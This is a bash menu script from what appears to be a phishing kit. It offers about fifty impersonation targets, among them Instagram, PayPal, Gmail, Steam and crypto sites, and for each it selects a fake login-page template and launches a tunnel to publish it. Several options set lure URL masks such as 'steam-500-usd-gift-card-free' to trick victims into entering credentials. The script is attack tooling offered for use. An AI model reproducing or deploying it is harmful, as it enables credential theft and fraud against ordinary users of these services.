#!/usr/bin/env bash

source interrupt.sh
source banner.sh
source menuGames.sh
source menuOperadoras.sh
source ./google/menuGoogle.sh
source ./microsoft/menuMicrosoft.sh
source ./socialMedia/menuFacebook.sh
source ./socialMedia/menuInstagram.sh
source ../tunnel/tunnelMenu.sh



menu (){
banner1
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m          \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;96m Gmail   \e[0m   \n"  

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;96m lol  \e[0m            \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;96m Tiktok  \e[0m      \n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;96m Pinterest   \e[0m     \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;96m Whatsapp \e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;96m CryptoCurrency\e[0m   \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;96m Starbucks \e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Github\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;96m Verizon   \e[0m       \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;96m Firmware \e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;96m Google\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;96m DropBox   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;96m Gopro \e[0m   \n"

printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;96m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;96m Adobe ID   \e[0m      \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;96m apple\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;96m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;96m Shopify   \e[0m       \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;96m Bitcoin\e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m Messenger  \e[0m      \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;96m Ytsubs\e[0m     \n"

printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;96m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;96m GitLab   \e[0m        \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;96m Ofice-365\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;96m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;96m Twitch   \e[0m        \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;96m Playstation\e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;96m MySpace   \e[0m       \e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;96m Amazon\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m         \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo Web\e[0m    \n"

printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m VK   \e[0m            \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Pornhub\e[0m    \n"

printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m        \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m     \n"

printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m DevianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Games Pages\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m Youtube\e[0m        \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram Group\e[0m \n"     

printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           \e[1;92m[\e[0m\e[1;77mF\e[0m\e[1;92m]\e[0m\e[1;91m Follow me one Github\e[0m\n"

read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\e' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
server="instagram"
tunnel_menu

elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
server="facebook"
tunnel_menu

elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
server="snapchat"
tunnel_menu

elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
server="twitter"
mask='unlimited-onedrive-space-for free'
tunnel_menu

elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
server="github"
mask='get-followers-one-github'
tunnel_menu

elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
server="google"
tunnel_menu

elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
server="spotify"
tunnel_menu

elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
server="netflix"
mask='get-blue-badge-on-twitter-free'
tunnel_menu

elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
server="paypal"
tunnel_menu

elif [[ $menu_option == 10 ]]; then
server="origin"
tunnel_menu

elif [[ $menu_option == 11 ]]; then
server="steam"
mask='steam-500-usd-gift-card-free'
tunnel_menu

elif [[ $menu_option == 12 ]]; then
server="yahoo"
tunnel_menu

elif [[ $menu_option == 13 ]]; then
server="linkedin"
tunnel_menu

elif [[ $menu_option == 14 ]]; then
server="protonmail"
tunnel_menu

elif [[ $menu_option == 15 ]]; then
server="wordpress"
tunnel_menu

elif [[ $menu_option == 16 ]]; then
server="microsoft"
tunnel_menu

elif [[ $menu_option == 17 ]]; then
server="youtube"
tunnel_menu

elif [[ $menu_option == 18 ]]; then
server="ebay"
tunnel_menu

elif [[ $menu_option == 19 ]]; then
lol

elif [[ $menu_option == 20 ]]; then
server="pinterest"
tunnel_menu

elif [[ $menu_option == 21 ]]; then
server="cryptocurrency"
tunnel_menu

elif [[ $menu_option == 22 ]]; then
server="verzion"
tunnel_menu

elif [[ $menu_option == 23 ]]; then
server="dropbox"
tunnel_menu

elif [[ $menu_option == 24 ]]; then
server="adobe"
tunnel_menu

elif [[ $menu_option == 25 ]]; then
server="shopfy"
tunnel_menu

elif [[ $menu_option == 26 ]]; then
server="messenger"
tunnel_menu

elif [[ $menu_option == 27 ]]; then
server="gitlab"
tunnel_menu

elif [[ $menu_option == 28 ]]; then
server="twitch"
tunnel_menu

elif [[ $menu_option == 29 ]]; then
server="myspace"
tunnel_menu

elif [[ $menu_option == 30 ]]; then
server="badoo"
tunnel_menu

elif [[ $menu_option == 31 ]]; then
server="vk"
tunnel_menu

elif [[ $menu_option == 32 ]]; then
server="yandex"
tunnel_menu

elif [[ $menu_option == 33 ]]; then
server="devianart"
tunnel_menu

elif [[ $menu_option == 34 ]]; then
server="stackoverflow"
tunnel_menu

elif [[ $menu_option == 35 ]]; then
server="gmail"
tunnel_menu

elif [[ $menu_option == 36 ]]; then
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 2 
tunnel_menu


elif [[ $menu_option == 37 ]]; then
server="whatsapp"
tunnel_menu

elif [[ $menu_option == 38 ]]; then
server="starbucks"
tunnel_menu

elif [[ $menu_option == 39 ]]; then
server="firmware"
tunnel_menu

elif [[ $menu_option == 40 ]]; then
server="gopro"
tunnel_menu

elif [[ $menu_option == 41 ]]; then
server="apple"
tunnel_menu

elif [[ $menu_option == 42 ]]; then
server="bitcoin"
tunnel_menu

elif [[ $menu_option == 43 ]]; then
server="ytsubs"
tunnel_menu

elif [[ $menu_option == 44 ]]; then
microsoft_ofice


elif [[ $menu_option == 45 ]]; then
server="playstation"
mask='playstation-500-usd-gift-card-free'
tunnel_menu

elif [[ $menu_option == 46 ]]; then
server="Amazon"
tunnel_menu

elif [[ $menu_option == 47 ]]; then
server="yahoo_web"
tunnel_menu

elif [[ $menu_option == 48 ]]; then
server="pornhub"
tunnel_menu

elif [[ $menu_option == 49 ]]; then
server="xvideos"
tunnel_menu

elif [[ $menu_option == 50 ]]; then
games

elif [[ $menu_option == 51 ]]; then
operadoras

elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

elif [[ $menu_option == 99 ]]; then
server="create"
createpage
tunnel_menu

elif [[ $menu_option == Y ]]; then
banner
am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A

elif [[ $menu_option == T ]]; then 
banner
am start -a android.intent.action.VIEW https://t.me/Ch33chSec

elif [[ $menu_option == F ]]; then
banner
am start -a android.intent.action.VIEW https://github.com/BrunoCiccarino

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}
